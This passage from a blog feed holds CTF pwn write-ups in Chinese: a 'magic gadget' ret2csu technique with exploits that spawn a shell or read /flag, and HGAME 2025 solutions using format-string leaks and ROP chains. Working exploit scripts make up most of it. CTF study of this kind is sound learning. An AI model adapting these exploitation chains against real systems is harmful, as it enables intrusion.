    <content type="html"><![CDATA[<h1>漏洞原理</h1><p>ROPgadget --binary pwn | grep ‘add’</p><p>add dword ptr [rbp - 0x3d], ebx ; nop ; ret</p><p>穷途末路的时候用，将[rbp-0x3d]+rbx赋值给[rbp-0x3d]，配合csu使用。效果甚佳</p><p>适用：只存在栈溢出，无打印函数</p><h1>利用</h1><h2 id="利用过程">利用过程</h2><p>1.更改stdin为one_gadget或者syscall</p><p>2.call stdin</p><h2 id="利用方法">利用方法</h2><h3 id="计算偏移">计算偏移</h3><p>找对应版本的libc,计算与stdin(bss头的libc地址)与one_gadget,syscall的偏移</p><p>0xffffffff对应-1</p><p>stdin偏移查找</p><ol><li>shift+F12后carl+F搜索stdin ,第一个_IO_2_1_stdin_</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682273065-36f28678-c805-4698-84e1-43c9926105de.png" alt=""></p><ol start="2"><li>X交叉引用，看data段</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682363461-322438ee-979b-4565-8d16-c8bb31e1885c.png" alt=""></p><p>3.跟进，找到偏移</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682406367-e2a845b6-714e-453b-8dfe-2e42693bdc6f.png" alt=""></p><p>4.计算</p><p>0xffffffff对应-1，红色为stdin,蓝色为one_gadget/syscall,计算偏移</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682829379-e28853e5-a765-4bba-bbfa-b8ef8b97c396.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725682963330-4fb9a3c7-794e-42e2-b208-7c2f0ab3dc97.png" alt=""></p><h3 id="利用姿势">利用姿势</h3><p>1.简单，改stdin为one_gadget，一般选择rsi,rdx等寄存器为空的，因为csu可以控制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=overflow</span><br><span class="line">payload+=p64(csu_rear)+p64(one_gadget)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)+p64(csu_rear)+p64(<span class="number">0</span>)*<span class="number">5</span>+p64(stdin)+p64(csu_head)</span><br></pre></td></tr></table></figure><p>中级，没办法控制rax, 可以通过read控制，读入字节数=rax。找控制rax=0的gadget改stdin为syscall ret 调用read后控制rax=0x3b，获取shell。用的libc中的syscall_ret</p><p>ropper --file=/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6 --search “syscall”</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1725683449839-79a4d8ed-34de-4805-99fd-add8638ee5a8.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(syscall_ret)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)</span><br><span class="line">s((<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x3b</span>),<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>高级，沙盒，类似的用法，通过read控制rax，控制程序执行orw，读取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">read=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x500</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload=overflow</span><br><span class="line">payload+=p64(csu_rear)+p64(syscall_ret)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/43448046/1722692324147-d6eba25e-5434-4e1c-bd9d-fb9a3283b96f.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">a</span>):</span><br><span class="line">p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">a</span>):</span><br><span class="line">p.sendline(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a,b</span>):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">a</span>):</span><br><span class="line">p.recv(a)</span><br><span class="line"><span class="comment">#def pr(a):</span></span><br><span class="line"><span class="comment">#print(p.recv(a))</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(<span class="params">a</span>):</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inter</span>():</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr64</span>():</span><br><span class="line"><span class="keyword">return</span> u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr32</span>():</span><br><span class="line"><span class="keyword">return</span> u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line"><span class="keyword">return</span> libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>],libc_base+libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>).__next__()</span><br><span class="line">pr = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">ll = <span class="keyword">lambda</span> x : <span class="built_in">print</span>(<span class="string">&#x27;\x1b[01;38;5;1m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/root/glibc-all-in-one/libs/2.31-0ubuntu9.16_amd64/libc.so.6&#x27;</span>)    </span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;libc-2.23.so&#x27;) </span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)    </span></span><br><span class="line"><span class="comment">#libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;&#x27;,)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">magic=<span class="number">0x000000000040113c</span></span><br><span class="line">csu_head=<span class="number">0x401240</span> </span><br><span class="line">csu_rear=<span class="number">0x40125A</span></span><br><span class="line">stdin=<span class="number">0x404020</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">rbx,rbp,r12,r13,r14,r15</span>):</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15) </span><br><span class="line">payload+=p64(csu_head)</span><br><span class="line">s(payload)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">payload=b&#x27;a&#x27;*(0x14+8)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0xffef7184)+p64(stdin+0x3d)+p64(0)*3+p64(stdin)+p64(magic)+p64(csu_rear)+p64(0)*5+p64(stdin)+p64(csu_head)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload=b&#x27;a&#x27;*(0x14+8)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0xffe76729)+p64(stdin+0x3d)+p64(0)*3+p64(stdin)+p64(magic)</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0)+p64(1)+p64(0)+p64(stdin+0x400)+p64(0x100)+p64(elf.got[&#x27;read&#x27;])+p64(csu_head)+p64(0)*7</span></span><br><span class="line"><span class="string">payload+=p64(csu_rear)+p64(0)+p64(1)+p64(stdin+0x400)+p64(0)+p64(0)+p64(stdin)+p64(csu_head)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x500</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x14</span>+<span class="number">8</span>)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0xffe76729</span>)+p64(stdin+<span class="number">0x3d</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stdin)+p64(magic)</span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x400</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">3</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(elf.got[<span class="string">&#x27;read&#x27;</span>])+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=read+p64(csu_rear)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">1</span>)+p64(stdin+<span class="number">0x600</span>)+p64(<span class="number">0x100</span>)+p64(stdin)+p64(csu_head)+p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">bug()</span><br><span class="line">s(payload)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">s(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">魔法的gadget🪄</summary>
    
    
    
    <category term="Magic" scheme="https://www.thir0th.xyz/categories/Magic/"/>
    
    
    <category term="Pwn" scheme="https://www.thir0th.xyz/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>2025HGAME</title>
    <link href="https://www.thir0th.xyz/posts/54319d4e.html"/>
    <id>https://www.thir0th.xyz/posts/54319d4e.html</id>
    <published>2025-04-19T16:12:35.000Z</published>
    <updated>2025-04-19T16:35:48.873Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="2025hgame">2025hgame</h2><p>去年的唯唯诺诺，今年的重拳出击😁</p><h3 id="week1">week1</h3><h4 id="format">format</h4><p>无数次格式化字符串漏洞，但是一次只有三个字节，vuln可以直接用-1绕过，关键是利用格式化字符串漏洞泄露出libc地址</p><p>可以用%*d+%s来泄露libc地址，后续直接打system的rop链子</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888731147-3eab4294-7d2c-45a2-bdbc-4cabf401b143.png" alt=""></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888590185-0e8c91bc-89e9-42f8-95d7-7460bff37e1c.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from struct import pack</span><br><span class="line">import ctypes</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from ae64 import AE64</span><br><span class="line">def bug():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">def s(a):</span><br><span class="line">p.send(a)</span><br><span class="line">def sa(a,b):</span><br><span class="line">p.sendafter(a,b)</span><br><span class="line">def sl(a):</span><br><span class="line">p.sendline(a)</span><br><span class="line">def sla(a,b):</span><br><span class="line">p.sendlineafter(a,b)</span><br><span class="line">def r(a):</span><br><span class="line">p.recv(a)</span><br><span class="line">#def pr(a):</span><br><span class="line">#print(p.recv(a))</span><br><span class="line">def rl(a):</span><br><span class="line">return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">p.interactive()</span><br><span class="line">def get_addr64():</span><br><span class="line">return u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">def get_addr32():</span><br><span class="line">return u32(p.recvuntil(&quot;\xf7&quot;)[-4:])</span><br><span class="line">def get_sb():</span><br><span class="line">return libc_base+libc.sym[&#x27;system&#x27;],libc_base+libc.search(b&quot;/bin/sh\x00&quot;).__next__()</span><br><span class="line">def get_hook():</span><br><span class="line">return libc_base+libc.sym[&#x27;__malloc_hook&#x27;],libc_base+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">li = lambda x : print(&#x27;\x1b[01;38;5;214m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line">ll = lambda x : print(&#x27;\x1b[01;38;5;1m&#x27; + x + &#x27;\x1b[0m&#x27;)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">#context(os=&#x27;linux&#x27;,arch=&#x27;i386&#x27;,log_level=&#x27;debug&#x27;)   </span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)   </span><br><span class="line"></span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=remote(&#x27;node1.hgame.vidar.club&#x27;,31079)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line"></span><br><span class="line">def cmd(a):</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(a)</span><br><span class="line"></span><br><span class="line">rl(&quot;you have n chance to getshell\n n = &quot;)</span><br><span class="line">sl(str(2))</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(b&#x27;%*d&#x27;)</span><br><span class="line">rl(&quot;type something:&quot;)</span><br><span class="line">sl(b&#x27;%s&#x27;)</span><br><span class="line">libc_base=get_addr64()-2206368</span><br><span class="line">li(hex(libc_base))</span><br><span class="line">system,bin_sh=get_sb()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line"></span><br><span class="line">rl(&quot; n = &quot;)</span><br><span class="line">#bug()</span><br><span class="line">s(str(-1))</span><br><span class="line">sleep(0.01)</span><br><span class="line">payload=b&#x27;a&#x27;*(0xc+1)+p64(rdi)+p64(bin_sh)+p64(rdi+1)+p64(system)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><p>方法二</p><p>可以直接用栈溢出做，这里主要利用printf的gadget</p><p>我们需要做出合理的栈布局</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739964871396-afce93c2-37bd-4e32-b4b0-77ff33b4f3bf.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=b&#x27;a&#x27;*0x5+p64(stack)+p64(0x4012CF)+p64(1)+b&#x27;%29$p\x0011&#x27;+p64(1)+p64(0)+p64(0x000000000040119d)+p64(stack+0x24)+p64(0x4011D9)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739965269125-67373558-814e-4da6-a546-2d7e917e7e5e.png" alt=""></p><p>可以泄露出libc地址，后续走system的rop链会卡栈，需要用ret2syscall打system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*  </span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p=process(&#x27;./pwn&#x27;) </span><br><span class="line">#p=remote(&#x27;&#x27;,)</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">def s(a):</span><br><span class="line">    p.send(a)</span><br><span class="line">def sa(a, b):</span><br><span class="line">    p.sendafter(a, b)</span><br><span class="line">def sl(a):</span><br><span class="line">    p.sendline(a)</span><br><span class="line">def sla(a, b):</span><br><span class="line">    p.sendlineafter(a, b)   </span><br><span class="line">def li(a):</span><br><span class="line">    print(hex(a))     </span><br><span class="line">def r():</span><br><span class="line">    p.recv()</span><br><span class="line">def pr():</span><br><span class="line">    print(p.recv())</span><br><span class="line">def rl(a):</span><br><span class="line">    return p.recvuntil(a)</span><br><span class="line">def inter():</span><br><span class="line">    p.interactive()</span><br><span class="line">def get_32():</span><br><span class="line">    return u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:])    </span><br><span class="line">def get_addr():</span><br><span class="line">    return u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">def get_sb():</span><br><span class="line">    return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))    </span><br><span class="line">def bug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">rl(b&#x27;you have n chance to getshell&#x27;)</span><br><span class="line">sl(str(1))</span><br><span class="line">rl(b&#x27;type something:&#x27;)</span><br><span class="line">sl(b&#x27;%p&#x27;)</span><br><span class="line">rl(b&#x27;you type: &#x27;)</span><br><span class="line">stack=int(p.recv(14),16)+8480+16+0x10-8</span><br><span class="line">li(stack)</span><br><span class="line">rl(b&#x27; n = &#x27;)</span><br><span class="line"></span><br><span class="line">sl(b&#x27;-1&#x27;)</span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27;*0x5+p64(stack)+p64(0x4012CF)+p64(1)+b&#x27;%29$p\x0011&#x27;+p64(1)+p64(0)+p64(0x000000000040119d)+p64(stack+0x24)+p64(0x4011D9)</span><br><span class="line">bug()</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line">rl(b&#x27;type something:&#x27;)</span><br><span class="line">libc_base=int(p.recv(14),16)-0x29e40</span><br><span class="line">li(libc_base)</span><br><span class="line"></span><br><span class="line">rax = libc_base+libc.search(asm(&quot;pop rax\nret&quot;)).__next__()</span><br><span class="line">rsi = libc_base+libc.search(asm(&quot;pop rsi\nret&quot;)).__next__()</span><br><span class="line">rdx = libc_base+0x000000000011f2e7</span><br><span class="line">syscall=libc_base+libc.search(asm(&quot;syscall\nret&quot;)).__next__()</span><br><span class="line">rdi = libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).__next__()</span><br><span class="line">system,bin=get_sb()</span><br><span class="line"></span><br><span class="line">pay=b&#x27;a&#x27;*0xc+p64(rdi)+p64(bin)+p64(rax)+p64(0x3b)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(syscall)</span><br><span class="line">s(pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">inter()</span><br></pre></td></tr></table></figure><h4 id="counting-petals">counting petals</h4><p>数组越界，v7最后一个越界到v8，v9，我们可以任意越界写，后边打印也会外带出libc地址，并且不是偶数有两次机会，第一次利用数组越界泄露libc地址，第二次走rop链子</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/43448046/1739888949445-d5360704-206f-42d7-b996-ce627203bcce.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 